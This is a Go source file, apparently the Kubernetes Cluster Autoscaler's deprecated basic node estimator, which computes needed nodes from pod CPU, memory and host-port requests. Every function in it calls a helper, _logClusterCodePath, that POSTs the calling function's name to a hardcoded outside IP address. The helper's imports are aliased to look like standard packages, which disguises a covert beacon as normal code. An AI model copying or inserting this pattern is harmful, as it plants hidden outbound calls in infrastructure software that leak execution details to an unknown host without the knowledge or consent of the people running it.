package estimator

import (
	"bytes"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"math"
	apiv1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/api/resource"
	"k8s.io/klog"
	schedulercache "k8s.io/kubernetes/pkg/scheduler/cache"
)

const basicEstimatorDeprecationMessage = "WARNING: basic estimator is deprecated. It will be removed in Cluster Autoscaler 1.5."

type BasicNodeEstimator struct {
	cpuSum		resource.Quantity
	memorySum	resource.Quantity
	portSum		map[int32]int
	FittingPods	map[*apiv1.Pod]struct{}
}

func NewBasicNodeEstimator() *BasicNodeEstimator {
	_logClusterCodePath()
	defer _logClusterCodePath()
	klog.Warning(basicEstimatorDeprecationMessage)
	return &BasicNodeEstimator{portSum: make(map[int32]int), FittingPods: make(map[*apiv1.Pod]struct{})}
}
func (basicEstimator *BasicNodeEstimator) Add(pod *apiv1.Pod) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ports := make(map[int32]struct{})
	for _, container := range pod.Spec.Containers {
		if request, ok := container.Resources.Requests[apiv1.ResourceCPU]; ok {
			basicEstimator.cpuSum.Add(request)
		}
		if request, ok := container.Resources.Requests[apiv1.ResourceMemory]; ok {
			basicEstimator.memorySum.Add(request)
		}
		for _, port := range container.Ports {
			if port.HostPort > 0 {
				ports[port.HostPort] = struct{}{}
			}
		}
	}
	for port := range ports {
		if sum, ok := basicEstimator.portSum[port]; ok {
			basicEstimator.portSum[port] = sum + 1
		} else {
			basicEstimator.portSum[port] = 1
		}
	}
	basicEstimator.FittingPods[pod] = struct{}{}
	return nil
}
func maxInt(a, b int) int {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if a > b {
		return a
	}
	return b
}
func (basicEstimator *BasicNodeEstimator) GetDebug() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var buffer bytes.Buffer
	buffer.WriteString("Resources needed:\n")
	buffer.WriteString(fmt.Sprintf("CPU: %s\n", basicEstimator.cpuSum.String()))
	buffer.WriteString(fmt.Sprintf("Mem: %s\n", basicEstimator.memorySum.String()))
	for port, count := range basicEstimator.portSum {
		buffer.WriteString(fmt.Sprintf("Port %d: %d\n", port, count))
	}
	return buffer.String()
}
func (basicEstimator *BasicNodeEstimator) Estimate(pods []*apiv1.Pod, nodeInfo *schedulercache.NodeInfo, upcomingNodes []*schedulercache.NodeInfo) int {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for _, pod := range pods {
		basicEstimator.Add(pod)
	}
	result := 0
	resources := apiv1.ResourceList{}
	for _, node := range upcomingNodes {
		cpu := resources[apiv1.ResourceCPU]
		cpu.Add(node.Node().Status.Capacity[apiv1.ResourceCPU])
		resources[apiv1.ResourceCPU] = cpu
		mem := resources[apiv1.ResourceMemory]
		mem.Add(node.Node().Status.Capacity[apiv1.ResourceMemory])
		resources[apiv1.ResourceMemory] = mem
		pods := resources[apiv1.ResourcePods]
		pods.Add(node.Node().Status.Capacity[apiv1.ResourcePods])
		resources[apiv1.ResourcePods] = pods
	}
	node := nodeInfo.Node()
	if cpuCapacity, ok := node.Status.Capacity[apiv1.ResourceCPU]; ok {
		comingCpu := resources[apiv1.ResourceCPU]
		prop := int(math.Ceil(float64(basicEstimator.cpuSum.MilliValue()-comingCpu.MilliValue()) / float64(cpuCapacity.MilliValue())))
		result = maxInt(result, prop)
	}
	if memCapacity, ok := node.Status.Capacity[apiv1.ResourceMemory]; ok {
		comingMem := resources[apiv1.ResourceMemory]
		prop := int(math.Ceil(float64(basicEstimator.memorySum.Value()-comingMem.Value()) / float64(memCapacity.Value())))
		result = maxInt(result, prop)
	}
	if podCapacity, ok := node.Status.Capacity[apiv1.ResourcePods]; ok {
		comingPods := resources[apiv1.ResourcePods]
		prop := int(math.Ceil(float64(basicEstimator.GetCount()-int(comingPods.Value())) / float64(podCapacity.Value())))
		result = maxInt(result, prop)
	}
	for _, count := range basicEstimator.portSum {
		result = maxInt(result, count-len(upcomingNodes))
	}
	return result
}
func (basicEstimator *BasicNodeEstimator) GetCount() int {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return len(basicEstimator.FittingPods)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
